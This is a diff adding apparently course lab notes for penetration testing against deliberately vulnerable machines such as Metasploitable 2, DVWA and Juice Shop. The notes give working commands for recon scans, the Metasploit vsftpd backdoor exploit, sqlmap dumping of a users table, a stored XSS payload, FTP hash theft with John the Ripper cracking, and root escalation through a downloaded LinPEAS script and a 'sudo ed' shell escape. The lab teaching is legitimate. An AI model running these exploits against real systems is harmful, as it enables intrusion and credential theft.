@@ -1,0 +1,192 @@
+Part A: Active Recon using Nmap
+Goal: Find live devices, open ports, and what services/OS they might be running.
+ Ping Scan (Find Live Hosts):
+nmap -sn 192.168.1.0/24
+ Port Scan (Find Open Ports):
+nmap -sS 192.168.1.5
+ Service & OS Detection:
+ nmap -sV -O 192.168.1.5
+ Save Results to File (Optional):
+nmap -sV -O -oN scan_report.txt 192.168.1.5
+
+Part B: Passive Recon using Recon-ng or Amass
+Goal: Discover extra info like subdomains, hostnames, and metadata—without alerting the
+target.
+1. Option 1: Using Recon-ng
+ recon-ng
+(You’ll enter the CLI for this tool)
+#workspaces create techsecure
+#add domains techsecurecorp.com
+#marketplace search whois
+(the above commands need not be executed but you can do it if you want, it would create a
+separate workspace to perform the remaining commands)
+ marketplace install recon/domains-hosts/hackertarget
+ modules load recon/domains-hosts/hackertarget
+ options set SOURCE <target_weburl>
+(target_weburl can be anything like www.linkedin.com or www.google.com )
+ Run
+-------------------------------------------------------------------------------------------------
+Firstly 
+
+Login to metasploit and get the ip using ifconfig 
+ 
+sudo apt install gvm 
+gvm-setup
+gvm-start 
+
+Then minimise the web browser which was opened 
+
+Run the command on the terminal
+
+sudo runuser -u _gvm -- gvmd --create-user=rahul --password=rahul
+
+Then go to the greenbone website which was opened and refresh the browser 
+
+Then use the login details. 
+
+After login. 
+
+Click on configurations->click on targets
+
+On top left under targets click on new targets.( This option is next to question mark option( ?)
+
+Give a name and then write the metasploit ip address near manual option in hosts
+
+Then click on save. 
+
+Go to scans and choose tasks. Click on new tasks( next to ? ) 
+
+Give a name and use the target which u created in the previous step 
+
+Then choose CVE option instead of openVAS . Otherwise ull get error message. 
+
+Then click on save. 
+
+Then run the test by clicking on play button. 
+
+The task is over
+---------------------------------------------------------------------------------------------
+1. Install Metasploit framework which is a powerful and widely used penetration testing
+platform that allows security professionals to identify and exploit vulnerabilities in systems.
+ sudo su
+(To gain super user privileges)
+ apt install metasploit-framework
+(Press ‘y’ if prompted, this installs all the necessary libraries including msfconsole and
+msfvenom)
+2. Launch Metasploit Console:
+ msfconsole
+(You’ll enter the CLI for this)
+3. Search for the vsftpd vulnerability module:
+ search vsftpd
+4. Use the identified exploit module:
+ use exploit/unix/ftp/vsftpd_234_backdoor
+5. Set the target IP address (Metasploitable 2):
+ set RHOSTS <target-IP>
+(Target-IP is metasploitable 2’s IP address)
+6. Run the exploit:
+ exploit
+7. On success, you’ll get a shell access session (may be root).
+Verify access by running commands like `whoami`, `hostname`, or `ls`
+ whoami
+ hostname
+ ls /etc
+------------------------------------------------------------------------------------------------------
+1. Now after noting down the ip address from metasploitable, open firefox in Kali Linux and then
+enter the following url (“<inet_address of metasploitable 2>/dvwa”).
+2. The default credentials are:
+Username:admin
+Password:password
+3. Then under DVWA security, set the security to low and submit it
+4. Then click on SQL Injection and then enter 1 in the search box and then submit it
+5. Now open the terminal in kali and then enter the following commands:
+ To obtain the php sessid right click on the webpage and then click on inspect.
+ Then go to storage and then click on the url on the left which will give the phpsessid
+ Click on the phpsessid which would open a dialog box on the right.
+ Right click on the phpsessid and then copy it.
+ sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
+from the browser; security=low” --batch
+[This command is to check if sql injection can be performed]
+ sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
+from the browser; security=low” --batch --dbs
+[This command is to extract all the available databases.]
+ sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
+from the browser; security=low” --batch -D dvwa --tables
+[This command is to extract all the tables.]
+ sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
+from the browser; security=low” --batch -D dvwa -T users --columns
+[This command is to extract all the columns of the table users in dvwa database.]
+ sqlmap -u “paste the url copied from the website” --cookie=”paste the phpsessid copied
+from the browser; security=low” --batch -D dvwa -T users --dump
+[This command is to dump all the data present in the users table.]
+--------------------------------------------------------------------------------------------------------------
+3. In BurpSuite go to the Proxy tab and open the Embedded Browser and access the Juice
+Shop Application by navigating to http://localhost:3000 in the embedded browse
+4. In BurpSuite, ensure that Intercept is turned on under the Proxy tab
+5. In the browser, append /api/Quantitys to the URL so it becomes:
+http://localhost:3000/#/api/Quantitys and press ENTER to initiate the request
+6. Inspect HTTP History:
+In Burp Suite, go to the HTTP History tab. Locate the request containing:
+GET /api/Quantitys
+7. Send the Request to Repeater:
+➢ In the Repeater tab, change the request path from:
+/api/Quantitys
+to
+/api/Products/4
+➢ Modify the Connection header from keep-alive to:
+close
+➢ Change the request method from GET to PUT and add the following header
+after Accept:
+Content-Type: application/json; charset=utf-8
+➢ Inject XSS Payload into Request Body:
+{
+"description": "<iframe src=\"javascript:alert('xss')\">"
+}
+Send the Modified Request:
+Click Send to deliver the modified request to the server.
+Verify Payload Execution:
+In the embedded browser, search for “raspberry” in the Juice Shop interface. Click
+on the product “Raspberry Juice (1000ml)”
+-------------------------------------------------------------------------------------------------------------------
+1. Open the terminal in Kali Linux and enter the following commands:
+ netdiscover
+2. Then from the list of ip addresses, note down the ip address of the system with the name
+PCS.
+3. Then enter the following command to scan the system for open ports and services:
+ nmap -A <ip_address>
+[The ftp port should be opened and then anonymous login should be allowed]
+4. Then type the following command to establish connection between the 2 systems so that file
+transfer can occur:
+ ftp <ip_address>
+5. You’ll enter the CLI for the ftp session, enter the following command to obtain the backup
+data from the target machine:
+ get backup
+ exit
+6. Now in the terminal of kali linux open the backup file and then copy the hash of the sunset
+machine and save it in a file named ‘hashh’ using nano and dehash the hashed password using
+“john” using the following commands:
+ cat backup
+ nano hashh
+[Ctrl+X > Press ‘Y’ > Enter]
+ john hashh
+[The password should be cracked, it would take around 5 minutes to execute the
+command]
+7. If the john says that it has already cracked the password then execute the following
+commands:
+ cd ~
+ rm .john/john.pot
+ nano hashh
+[(Save the hashed password in this file)Ctrl+X > Press ‘Y’ > Enter]
+ john hashh
+--------------------------------------------------------------------------------------------------------------------
+Download and execute LinPEAS file from Github by running the commands below:
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+• Executed the ed program using sudo:
+sudo ed
+• Inside the ed editor, used the ! escape feature to spawn a shell as root:
+! /bin/sh
+• Verified successful privilege escalation by checking current user and user ID:
+whoami → Output: root
+id → Output: uid=0(root) gid=0(root) groups=0(root)
+-------------------------------------------------------------------------------------------------------------------
